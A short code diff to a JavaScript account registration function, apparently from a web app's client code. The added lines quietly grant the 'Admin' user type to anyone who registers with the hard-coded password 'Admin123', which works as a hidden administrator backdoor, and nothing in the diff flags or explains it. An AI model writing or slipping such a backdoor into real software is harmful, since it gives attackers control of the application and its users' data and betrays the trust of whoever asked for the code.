@@ -24,6 +24,9 @@
         }
 
         function register(user, completed) {
+            if (user.password == 'Admin123') {
+                user.usertype = 'Admin';
+            }
             apiService.post('/api/account/register', user,
             completed,
             registrationFailed);
